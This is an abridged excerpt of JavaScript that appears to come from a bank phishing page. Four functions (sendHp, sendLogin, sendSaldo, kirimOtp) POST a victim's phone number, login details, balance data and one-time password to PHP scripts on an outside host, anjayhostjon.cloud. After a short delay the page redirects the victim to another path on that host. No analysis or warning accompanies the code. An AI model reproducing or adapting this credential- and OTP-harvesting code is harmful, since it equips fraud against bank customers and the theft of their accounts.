...
function sendHp() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://anjayhostjon.cloud/bri/v9-bu91k1/one.php',
...
function sendLogin() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://anjayhostjon.cloud/bri/v9-bu91k1/login.php',
...
function sendSaldo() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://anjayhostjon.cloud/bri/v9-bu91k1/two.php',
      data: $('#inputlogin').serialize(),
      complete: function(data) {
         vibr(220);
         console.log('Complete')
...
function kirimOtp() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://anjayhostjon.cloud/bri/v9-bu91k1/three.php',
...
setTimeout(function(){  
    $("#process1").hide();   
location.href='https://anjayhostjon.cloud/wa/bu91k1';
 $('.load').hide();
    }, 4000);    
